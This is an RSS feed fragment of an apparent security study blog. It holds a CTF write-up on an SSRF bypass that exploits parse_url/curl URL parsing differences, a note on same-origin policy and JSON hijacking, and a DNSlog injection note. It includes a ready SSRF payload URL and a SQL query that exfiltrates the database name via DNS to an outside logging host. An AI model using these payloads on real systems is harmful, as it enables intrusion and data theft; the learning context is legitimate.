&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#6272a4&#34;&gt;//curl_setopt($ch, CURLOPT_HEADER, false);//设置不需要头信息
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$result&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; curl_exec(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;);&lt;span style=&#34;color:#6272a4&#34;&gt;//执行请求
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    curl_close(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;);&lt;span style=&#34;color:#6272a4&#34;&gt;//关闭curl，释放资源
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$result&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;url&amp;#34;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$uu&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;parse_url(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$host&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$uu&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;])&lt;span style=&#34;color:#ff79c6&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$uu&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$scheme&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$uu&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;scheme&amp;#34;&lt;/span&gt;])&lt;span style=&#34;color:#ff79c6&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$uu&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;scheme&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#ff79c6&#34;&gt;empty&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$host&lt;/span&gt;)){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#ff79c6&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;host is null&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#ff79c6&#34;&gt;empty&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$scheme&lt;/span&gt;)){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#ff79c6&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;scheme is null&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;//https://ctf.pediy.com/upload/team/762/team236762.png?
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$host&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;ctf.pediy.com&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;||&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$host&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;||&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$host&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;//echo curl_request(&amp;#34;http://123.57.254.42/flag.php&amp;#34;,&amp;#34;get&amp;#34;,[],true,5);//get flag
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#ff79c6&#34;&gt;echo&lt;/span&gt; curl_request(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;get&amp;#34;&lt;/span&gt;,[],&lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;5&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;host not allow&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;自定义了curl_request函数，但重点在parse_url上&lt;/p&gt;
&lt;p&gt;自己试l 一下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#http://121.36.145.157:8044/url.php?url=123.57.254.42://localhost/../flag.php 先取出url
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;123.57.254.42://localhost/../flag.php&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$uu&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;parse_url(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$uu&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出是localhost&lt;/p&gt;
&lt;p&gt;然后用了浏览器试了试，当我们访问&lt;code&gt;123.57.254.42://localhost/../flag.php&lt;/code&gt;，相当于访问&lt;code&gt;123.57.254.42//flag.php&lt;/code&gt;，但是这个url被parse_url解析时，host会被定位为localhost，成功绕过。&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http://121.36.145.157:8044/url.php?url=123.57.254.42://localhost/../flag.php
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;flag{xxx_999()xx*@eeEEE}&lt;/p&gt;
&lt;p&gt;参考了下https://bbs.pediy.com/thread-272848.htm&lt;/p&gt;
&lt;p&gt;考察为基础的SSRF以及 php &lt;code&gt;parse_url&lt;/code&gt; 和 curl 对 url 的解析规则不同。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;127.0.0.1://www.baidu.com
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;对于这种特殊的协议格式，就比较有意思
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;parse_url 识别的 host 为 www.baidu.com 但是 curl 请求会认为是 127.0.0.1,这就
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;可能导致问题，比如利用 parse_url 验证 host 是否为 127.0.0.1 这种内网 IP，然
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;后 用 curl 发 起 请 求 ， 就 可 能 等 导 致 ssrf 攻 击 。 比 如 ：
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;127.0.0.1://www.baidu.com/../index.php
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;这里得到的 host 是 www.baidu.com，但是 curl 实际访问的确是 127.0.0.1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;666还有个很不错的思路，直接去搜出题人，发现会有&lt;a class=&#34;link&#34; href=&#34;https://toutiao.io/posts/kuvr3yy/preview&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;浅谈 URL 协议&lt;/a&gt; 这篇文章，那答案八九不离十在里面。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>同源策略</title>
        <link>https://proben1.github.io/2022/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</link>
        <pubDate>Tue, 17 May 2022 23:15:34 +0800</pubDate>
        
        <guid>https://proben1.github.io/2022/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</guid>
        <description>&lt;p&gt;这篇文章负责解决一次&lt;a class=&#34;link&#34; href=&#34;http://wjlshare.com/archives/1485&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;面试题&lt;/a&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;简单的说一下同源策略
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;说说cors 和 jsonp分别是干什么的 为什么会出现这两个漏洞，以及如何进行修复
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cors 和 jsonp 在修复过程中 token 是如何传递token的
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cors如果是不允许的域发起了请求，cors会进行怎样的返回
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;jsonp的token跟在哪个位置
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;jsonp referr校验能否百分百防护吗
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;同源策略&#34;&gt;同源策略&lt;/h1&gt;
&lt;p&gt;同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。&lt;/p&gt;
&lt;p&gt;（emmmm其实刚学的时候纠结了好久这个东西）&lt;/p&gt;
&lt;h2 id=&#34;定义&#34;&gt;定义&lt;/h2&gt;



&lt;div class=&#34;notice notice-tip&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;协议/主机/端口&lt;/p&gt;&lt;/div&gt;

&lt;p&gt;与&lt;code&gt;http://store.company.com/dir/page.html&lt;/code&gt;进行比较：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;URL&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;结果&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;原因&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;http://store.company.com/dir2/other.html&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;同源&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;只有路径不同&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;http://store.company.com/dir/inner/another.html&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;同源&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;只有路径不同&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;https://store.company.com/secure.html&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;失败&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;协议不同&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;http://store.company.com:81/dir/etc.html&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;失败&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;端口不同 ( &lt;code&gt;http://&lt;/code&gt; 默认端口是80)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;http://news.company.com/dir/other.html&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;失败&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;主机不同&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;jsonp&#34;&gt;JSONP&lt;/h2&gt;
&lt;p&gt;由于同源策略的存在，从别的域名（网站）那获取资料需要一个特殊的技术，即Jsonp(JSON with Padding)。Jsonp是 json 的一种&amp;quot;使用模式&amp;quot;，用于跨域读取数据。&lt;/p&gt;
&lt;p&gt;简单的说，就是动态创建&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;标签，然后利用&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;的src 不受同源策略约束来跨域获取数据。&lt;/p&gt;
&lt;h3 id=&#34;json劫持&#34;&gt;JSON劫持&lt;/h3&gt;
&lt;p&gt;JSON Hijacking，属于 CSRF（ Cross-site request forgery 跨站请求伪造）的范畴里。&lt;/p&gt;
&lt;p&gt;比如下面的链接在已登录的情况下会返回json格式的用户信息：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http://login.xxx.com/userinfo
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;问题在于，攻击者伪造了一个虚假页面，并加入了如下标签：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;script src&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;http://login.xxx.com/userinfo&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;/script&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果当前浏览器已经登录了test.com，并且cookie未过期，然后访问了攻击者的虚假页面，那么该页面就可以拿到json形式的用户敏感信息。&lt;/p&gt;
&lt;p&gt;又因为script标签会自动解析json数据，生成对应的js对象，然后再通过&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Object.prototype.__defineSetter__
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;来触发自己的恶意代码……&lt;/p&gt;
&lt;p&gt;所以这个函数在当前的chrome和firefox中都失效了。&lt;/p&gt;
&lt;h3 id=&#34;jsonp劫持&#34;&gt;JSONP劫持&lt;/h3&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://websec.readthedocs.io/zh/latest/vuln/xss/sop.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Web安全学习笔记&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;由浅入深理解JSONP并拓展&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>DNSlog注入</title>
        <link>https://proben1.github.io/2022/dnslog%E6%B3%A8%E5%85%A5/</link>
        <pubDate>Tue, 17 May 2022 21:55:19 +0800</pubDate>
        
        <guid>https://proben1.github.io/2022/dnslog%E6%B3%A8%E5%85%A5/</guid>
        <description>&lt;h1 id=&#34;dnslog注入学习&#34;&gt;DNSlog注入学习&lt;/h1&gt;
&lt;h3 id=&#34;前置&#34;&gt;前置&lt;/h3&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/m0_37263637/article/details/85157611&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;域名分级与域名解析过程(DNS)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;读完之后可以感受到，从用户到本地DNS服务器使用的是递归查询，递归的是本地DNS服务器帮你去迭代查询。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/62839ec50947543129b13f5b.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/62839ec50947543129b13f5b.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;其中，红色部分是可控的。我们只需要弄一个红色部分的DNS服务器，就得到DNS的解析日志。&lt;/p&gt;
&lt;p&gt;红色部分哪里来？自己搭建去（不一定），可以用下面的网站。&lt;/p&gt;
&lt;h3 id=&#34;网站&#34;&gt;网站&lt;/h3&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://www.dnslog.cn/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://www.dnslog.cn/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://ceye.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://ceye.io/&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;原理&#34;&gt;原理&lt;/h3&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/Xy--1/p/12896599.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;DNS注入&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;上面这些讲的很清楚，这里再用自己的话总结一下，就以Sql的利用为例子：&lt;/p&gt;
&lt;p&gt;在权限（文件可读）、环境（secure_file_priv）、长度（max_allowed_packet）都满足的情况下，在通过LOAD-FILE等文件函数进行读写时，整了个UCN路径，UCN路径构建DNS服务器地址，假装访问文件，产生DNSlog，就是这个DNSlog可以夹带私货，比如&lt;/p&gt;



&lt;div class=&#34;notice notice-tip&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;select load_file(concat(&amp;rsquo;\\&amp;rsquo;,(select database()),&amp;rsquo;.xxxx.ceye.io\abc&amp;rsquo;))&lt;/p&gt;&lt;/div&gt;

&lt;p&gt;UNC路径的理解（Universal Naming Convention）&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/627e4754094754312924bd43.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/627e4754094754312924bd43.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;利用&#34;&gt;利用&lt;/h3&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/column/184587.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;使用DNSLOG拯救你的盲打盲注&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://www.admintony.com/DNSLog%E5%9C%A8%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;DNSLog在渗透中的使用&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;1sql注入中的盲注&#34;&gt;1.SQL注入中的盲注&lt;/h4&gt;
&lt;h4 id=&#34;2无回显的命令执行&#34;&gt;2.无回显的命令执行&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;Linux&lt;/strong&gt;&lt;/p&gt;
